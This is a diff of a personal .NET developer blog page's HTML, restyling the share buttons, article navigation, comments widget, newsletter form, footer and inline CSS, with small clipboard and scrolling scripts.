+                                <path d="M0 1.146C0 .513.526 0 1.175 0h13.65C15.474 0 16 .513 16 1.146v13.708c0 .633-.526 1.146-1.175 1.146H1.175C.526 16 0 15.487 0 14.854V1.146zm4.943 12.248V6.169H2.542v7.225h2.401zm-1.2-8.212c.837 0 1.358-.554 1.358-1.248-.015-.709-.52-1.248-1.342-1.248-.822 0-1.359.54-1.359 1.248 0 .694.521 1.248 1.327 1.248h.016zm4.908 8.212V9.359c0-.216.016-.432.08-.586.173-.431.568-.878 1.232-.878.869 0 1.216.662 1.216 1.634v3.865h2.401V9.25c0-2.22-1.184-3.252-2.764-3.252-1.274 0-1.845.7-2.165 1.193v.025h-.016a5.54 5.54 0 0 1 .016-.025V6.169h-2.4c.03.678 0 7.225 0 7.225h2.4z"/>
+                            </svg>
+                            LinkedIn
+                        </a>
+                        <button class="share-btn copy" onclick="copyToClipboard()">
+                            <svg width="20" height="20" fill="currentColor" viewBox="0 0 16 16">
+                                <path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"/>
+                                <path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z"/>
+                            </svg>
+                            Copy Link
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="article-navigation">
+                    <a href="facets-in-dotnet.html" class="nav-btn prev">
+                        <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+                            <path d="M11.354 1.646a.5.5 0 0 1 0 .708L5.707 8l5.647 5.646a.5.5 0 0 1-.708.708l-6-6a.5.5 0 0 1 0-.708l6-6a.5.5 0 0 1 .708 0z"/>
+                        </svg>
+                        Facets in .NET
+                    </a>
+                    <a href="blog.html" class="nav-btn next">
+                        All Blog Posts
+                        <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+                            <path d="M4.646 1.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1 0 .708l-6 6a.5.5 0 0 1-.708-.708L10.293 8 4.646 2.354a.5.5 0 0 1 0-.708z"/>
+                        </svg>
                     </a>
                 </div>
-
-                <!-- Comments Section -->
-                <section class="comments-section">
-                    <h2>Comments</h2>
-                    <div class="comments-container">
-                        <script src="https://utteranc.es/client.js"
-                                repo="Tim-Maes/Tim-Maes.github.io"
-                                issue-term="title"
-                                label="blog-comments"
-                                theme="github-light"
-                                crossorigin="anonymous"
-                                async>
-                        </script>
-                    </div>
-                </section>
             </div>
+
+            <!-- Comments Section -->
+            <section class="comments-section">
+                <h2>Comments</h2>
+                <div class="comments-container">
+                    <script src="https://utteranc.es/client.js"
+                            repo="Tim-Maes/Tim-Maes.github.io"
+                            issue-term="pathname"
+                            theme="github-dark"
+                            crossorigin="anonymous"
+                            async>
+                    </script>
+                </div>
+            </section>
         </div>
     </article>
+
+    <!-- Newsletter Section -->
+    <section class="newsletter-section">
+        <div class="container">
+            <div class="newsletter-content">
+                <h3>Stay Updated</h3>
+                <p>Get notified when I publish new articles about .NET development, security, and modern software engineering practices.</p>
+                <div class="newsletter-form">
+                    <input type="email" placeholder="Enter your email" class="newsletter-input">
+                    <button class="newsletter-btn">Subscribe</button>
+                </div>
+                <p class="newsletter-note">No spam, unsubscribe at any time.</p>
+            </div>
+        </div>
+    </section>
 
     <!-- Footer -->
     <footer class="footer">
         <div class="container">
             <div class="footer-content">
                 <div class="footer-brand">
-                    <div class="logo">
-                        <div class="shield-icon"></div>
-                        <span>Tim Maes</span>
-                    </div>
-                    <p>Building secure and innovative solutions</p>
+                    <span class="brand-text">Tim<span class="accent">Maes</span></span>
+                    <p>Building secure and innovative solutions for the .NET ecosystem</p>
                 </div>
+                
                 <div class="footer-links">
                     <div class="footer-section">
-                        <h4>My work</h4>
-                        <a href="https://marketplace.visualstudio.com/publishers/TimMaes">VS Marketplace</a>
-                        <a href="https://www.nuget.org/profiles/Tim-Maes">NuGet</a>
+                        <h4>Navigation</h4>
+                        <a href="index.html">Home</a>
+                        <a href="index.html#about">About</a>
+                        <a href="projects.html">Projects</a>
+                        <a href="blog.html">Blog</a>
                     </div>
+                    
+                    <div class="footer-section">
+                        <h4>Popular Posts</h4>
+                        <a href="blazorframe-enhanced-iframes.html">BlazorFrame</a>
+                        <a href="facets-in-dotnet.html">Facets in .NET</a>
+                        <a href="source-generators-vs-t4.html">Source Generators vs T4</a>
+                        <a href="autowiring-using-bindicate.html">Autowiring with Bindicate</a>
+                    </div>
+                    
                     <div class="footer-section">
                         <h4>Connect</h4>
                         <a href="https://github.com/Tim-Maes" target="_blank">GitHub</a>
                         <a href="https://linkedin.com/in/tim-maes" target="_blank">LinkedIn</a>
                         <a href="mailto:hello@timmaes.dev">Email</a>
+                        <a href="resume.html">Resume</a>
                     </div>
                 </div>
             </div>
+            
             <div class="footer-bottom">
                 <p>&copy; 2025 Tim Maes. All rights reserved.</p>
+                <div class="footer-badges">
+                    <span>Made with ❤️ in Belgium</span>
+                    <span>•</span>
+                    <span>Open Source Enthusiast</span>
+                </div>
             </div>
         </div>
     </footer>
 
-    <script>
-        // Mobile menu toggle
-        const hamburger = document.querySelector('.hamburger');
-        const navMenu = document.querySelector('.nav-menu');
+    <!-- Scripts -->
+    <script src="script.js"></script>
+    
+    <!-- Include the styles from the template -->
+    <style>
+        .article-header {
+            padding: calc(var(--space-4xl) + 80px) 0 var(--space-4xl);
+            background: var(--bg-primary);
+            position: relative;
+            overflow: hidden;
+        }
 
-        hamburger.addEventListener('click', () => {
-            hamburger.classList.toggle('active');
-            navMenu.classList.toggle('active');
-        });
+        .article-header-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: -1;
+        }
 
-        // Header scroll effect
-        window.addEventListener('scroll', () => {
-            const header = document.querySelector('.header');
-            if (window.scrollY > 100) {
-                header.classList.add('scrolled');
-            } else {
-                header.classList.remove('scrolled');
+        .article-particles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(circle at 15% 85%, rgba(100, 255, 218, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 85% 15%, rgba(124, 58, 237, 0.1) 0%, transparent 50%);
+        }
+
+        .article-header-content {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .article-breadcrumb {
+            display: flex;
+            align-items: center;
+            gap: var(--space-sm);
+            margin-bottom: var(--space-lg);
+            font-size: 0.875rem;
+            color: var(--text-muted);
+        }
+
+        .article-breadcrumb a {
+            color: var(--accent-primary);
+            text-decoration: none;
+            transition: color var(--transition-fast);
+        }
+
+        .article-breadcrumb a:hover {
+            color: var(--text-primary);
+        }
+
+        .article-meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: var(--space-lg);
+            margin-bottom: var(--space-lg);
+            font-size: 0.875rem;
+            color: var(--text-muted);
+        }
+
+        .article-category {
+            background: var(--accent-primary);
+            color: var(--bg-primary);
+            padding: var(--space-xs) var(--space-sm);
+            border-radius: var(--radius-sm);
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .article-title {
+            font-size: clamp(2rem, 6vw, 3.5rem);
+            font-weight: 900;
+            line-height: 1.1;
+            margin-bottom: var(--space-lg);
+            background: var(--accent-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .article-subtitle {
+            font-size: 1.25rem;
+            color: var(--text-secondary);
+            line-height: 1.6;
+            margin-bottom: var(--space-xl);
+        }
+
+        .article-tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: var(--space-sm);
+            margin-bottom: var(--space-xl);
+        }
+
+        .article-tags span {
+            background: rgba(124, 58, 237, 0.2);
+            color: var(--accent-primary);
+            padding: var(--space-xs) var(--space-sm);
+            border-radius: var(--radius-sm);
+            font-size: 0.75rem;
+            font-weight: 500;
+        }
+
+        .article-author {
+            display: flex;
+            align-items: center;
+            gap: var(--space-md);
+        }
+
+        .author-photo {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid var(--accent-primary);
+        }
+
+        .author-name {
+            display: block;
+            color: var(--text-primary);
+            font-weight: 600;
+        }
+
+        .author-title {
+            display: block;
+            color: var(--text-muted);
+            font-size: 0.875rem;
+        }
+
+        .article-content {
+            padding: var(--space-4xl) 0;
+            background: var(--bg-secondary);
+        }
+
+        .article-layout {
+            display: grid;
+            grid-template-columns: 250px 1fr;
+            gap: var(--space-4xl);
+            align-items: start;
+        }
+
+        .article-toc {
+            position: sticky;
+            top: calc(80px + var(--space-lg));
+            background: var(--bg-primary);
+            border-radius: var(--radius-lg);
+            padding: var(--space-lg);
+            border: 1px solid rgba(100, 255, 218, 0.1);
+        }
+
+        .article-toc h3 {
+            color: var(--text-primary);
+            font-weight: 600;
+            margin-bottom: var(--space-md);
+            font-size: 1rem;
+        }
+
+        .toc-nav ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        .toc-nav li {
+            margin-bottom: var(--space-sm);
+        }
+
+        .toc-nav a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 0.875rem;
+            transition: color var(--transition-fast);
+            line-height: 1.4;
+        }
+
+        .toc-nav a:hover {
+            color: var(--accent-primary);
+        }
+
+        .article-body {
+            background: var(--bg-primary);
+            border-radius: var(--radius-xl);
+            padding: var(--space-4xl);
+            border: 1px solid rgba(100, 255, 218, 0.1);
+            min-height: 100vh;
+        }
+
+        .article-body h2 {
+            font-size: 1.875rem;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin: var(--space-4xl) 0 var(--space-lg);
+            position: relative;
+            padding-bottom: var(--space-sm);
+            border-bottom: 2px solid rgba(100, 255, 218, 0.2);
+        }
+
+        .article-body h2:first-child {
+            margin-top: 0;
+        }
+
+        .article-body h3 {
+            font-size: 1.375rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin: var(--space-2xl) 0 var(--space-md);
+        }
+
+        .article-body h4 {
+            font-size: 1.125rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin: var(--space-xl) 0 var(--space-sm);
+        }
+
+        .article-body p {
+            color: var(--text-secondary);
+            line-height: 1.8;
+            margin-bottom: var(--space-lg);
+            font-size: 1.125rem;
+        }
+
+        .article-body ul,
+        .article-body ol {
+            margin-bottom: var(--space-lg);
+            padding-left: var(--space-xl);
+            color: var(--text-secondary);
+        }
+
+        .article-body li {
+            margin-bottom: var(--space-sm);
+            line-height: 1.7;
+            font-size: 1.125rem;
+        }
+
+        .article-body a {
+            color: var(--accent-primary);
+            text-decoration: none;
+            border-bottom: 1px solid transparent;
+            transition: border-color var(--transition-fast);
+        }
+
+        .article-body a:hover {
+            border-bottom-color: var(--accent-primary);
+        }
+
+        .article-body blockquote {
+            background: rgba(100, 255, 218, 0.05);
+            border-left: 4px solid var(--accent-primary);
+            padding: var(--space-lg);
+            margin: var(--space-xl) 0;
+            border-radius: 0 var(--radius-md) var(--radius-md) 0;
+            font-style: italic;
+        }
+
+        .article-body blockquote p {
+            color: var(--text-primary);
+            margin-bottom: 0;
+        }
+
+        .article-body pre {
+            background: #1a1a1a;
+            border-radius: var(--radius-lg);
+            padding: var(--space-xl);
+            margin: var(--space-xl) 0;
+            overflow-x: auto;
+            border: 1px solid rgba(100, 255, 218, 0.1);
+        }
+
+        .article-body code {
+            font-family: var(--font-mono);
+            font-size: 0.9em;
+        }
+
+        .article-body :not(pre) > code {
+            background: rgba(100, 255, 218, 0.1);
+            color: var(--accent-primary);
+            padding: var(--space-xs) var(--space-sm);
+            border-radius: var(--radius-sm);
+        }
+
+        .code-callout {
+            background: rgba(124, 58, 237, 0.1);
+            border: 1px solid rgba(124, 58, 237, 0.2);
+            border-radius: var(--radius-lg);
+            padding: var(--space-lg);
+            margin: var(--space-xl) 0;
+        }
+
+        .code-callout h4 {
+            color: var(--text-primary);
+            margin: 0 0 var(--space-sm);
+        }
+
+        .code-callout p {
+            margin: 0;
+            color: var(--text-secondary);
+        }
+
+        .resources-section {
+            margin-top: var(--space-4xl);
+            padding-top: var(--space-4xl);
+            border-top: 2px solid rgba(100, 255, 218, 0.2);
+        }
+
+        .resources-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: var(--space-xl);
+            margin-top: var(--space-lg);
+        }
+
+        .resource-item h4 {
+            color: var(--text-primary);
+            margin-bottom: var(--space-md);
+        }
+
+        .resource-item ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        .resource-item li {
+            margin-bottom: var(--space-sm);
+        }
+
+        .article-footer {
+            margin-top: var(--space-4xl);
+            padding-top: var(--space-2xl);
+            border-top: 2px solid rgba(100, 255, 218, 0.2);
+        }
+
+        .article-sharing {
+            margin-bottom: var(--space-2xl);
+        }
+
+        .article-sharing h3 {
+            color: var(--text-primary);
+            font-weight: 600;
+            margin-bottom: var(--space-md);
+        }
+
+        .sharing-buttons {
+            display: flex;
+            gap: var(--space-md);
+            flex-wrap: wrap;
+        }
+
+        .share-btn {
+            display: flex;
+            align-items: center;
+            gap: var(--space-sm);
+            padding: var(--space-sm) var(--space-lg);
+            border-radius: var(--radius-lg);
+            text-decoration: none;
+            font-weight: 500;
+            border: none;
+            cursor: pointer;
+            transition: all var(--transition-fast);
+            font-family: inherit;
+            font-size: 0.875rem;
+        }
+
+        .share-btn.twitter {
+            background: #1DA1F2;
+            color: white;
+        }
+
+        .share-btn.linkedin {
+            background: #0A66C2;
+            color: white;
+        }
+
+        .share-btn.copy {
+            background: var(--bg-tertiary);
+            color: var(--text-primary);
+            border: 1px solid rgba(100, 255, 218, 0.2);
+        }
+
+        .share-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-md);
+        }
+
+        .article-navigation {
+            display: flex;
+            justify-content: space-between;
+            gap: var(--space-lg);
+        }
+
+        .nav-btn {
+            display: flex;
+            align-items: center;
+            gap: var(--space-sm);
+            padding: var(--space-md) var(--space-lg);
+            background: var(--bg-tertiary);
+            color: var(--text-primary);
+            text-decoration: none;
+            border-radius: var(--radius-lg);
+            transition: all var(--transition-fast);
+            border: 1px solid rgba(100, 255, 218, 0.1);
+        }
+
+        .nav-btn:hover {
+            background: rgba(100, 255, 218, 0.1);
+            border-color: var(--accent-primary);
+        }
+
+        .comments-section {
+            margin-top: var(--space-4xl);
+            padding-top: var(--space-2xl);
+            border-top: 2px solid rgba(100, 255, 218, 0.2);
+        }
+
+        .comments-section h2 {
+            color: var(--text-primary);
+            font-weight: 700;
+            margin-bottom: var(--space-xl);
+            text-align: center;
+        }
+
+        .newsletter-section {
+            padding: var(--space-4xl) 0;
+            background: var(--bg-primary);
+        }
+
+        .newsletter-content {
+            text-align: center;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .newsletter-content h3 {
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: var(--space-md);
+            color: var(--text-primary);
+        }
+
+        .newsletter-content p {
+            font-size: 1.125rem;
+            color: var(--text-secondary);
+            margin-bottom: var(--space-xl);
+        }
+
+        .newsletter-form {
+            display: flex;
+            gap: var(--space-md);
+            margin-bottom: var(--space-md);
+        }
+
+        .newsletter-input {
+            flex: 1;
+            padding: var(--space-md) var(--space-lg);
+            background: var(--bg-secondary);
+            border: 1px solid rgba(100, 255, 218, 0.2);
+            border-radius: var(--radius-lg);
+            color: var(--text-primary);
+            font-size: 1rem;
+        }
+
+        .newsletter-input::placeholder {
+            color: var(--text-muted);
+        }
+
+        .newsletter-input:focus {
+            outline: none;
+            border-color: var(--accent-primary);
+        }
+
+        .newsletter-btn {
+            background: var(--accent-gradient);
+            color: var(--bg-primary);
+            border: none;
+            padding: var(--space-md) var(--space-xl);
+            border-radius: var(--radius-lg);
+            font-weight: 600;
+            cursor: pointer;
+            transition: all var(--transition-fast);
+        }
+
+        .newsletter-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-accent);
+        }
+
+        .newsletter-note {
+            font-size: 0.875rem;
+            color: var(--text-muted);
+        }
+
+        /* Responsive design */
+        @media (max-width: 1024px) {
+            .article-layout {
+                grid-template-columns: 1fr;
+                gap: var(--space-2xl);
             }
-        });
+
+            .article-toc {
+                position: static;
+                order: -1;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .article-body {
+                padding: var(--space-xl);
+            }
+
+            .article-meta {
+                flex-direction: column;
+                gap: var(--space-sm);
+            }
+
+            .sharing-buttons {
+                flex-direction: column;
+            }
+
+            .article-navigation {
+                flex-direction: column;
+            }
+
+            .newsletter-form {
+                flex-direction: column;
+            }
+
+            .resources-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+
+    <script>
+        // Copy to clipboard functionality
+        function copyToClipboard() {
+            navigator.clipboard.writeText(window.location.href).then(function() {
+                const btn = document.querySelector('.share-btn.copy');
+                const originalText = btn.innerHTML;
+                btn.innerHTML = '<svg width="20" height="20" fill="currentColor" viewBox="0 0 16 16"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg>Copied!';
+                setTimeout(() => {
+                    btn.innerHTML = originalText;
+                }, 2000);
+            });
+        }
 
         // Initialize syntax highlighting
         hljs.highlightAll();
+
+        // Smooth scroll for TOC links
+        document.querySelectorAll('.toc-nav a').forEach(link => {
+            link.addEventListener('click', function(e) {
+                e.preventDefault();
+                const targetId = this.getAttribute('href').substring(1);
+                const targetElement = document.getElementById(targetId);
+                if (targetElement) {
+                    targetElement.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                }
+            });
+        });
     </script>
 </body>
 </html>
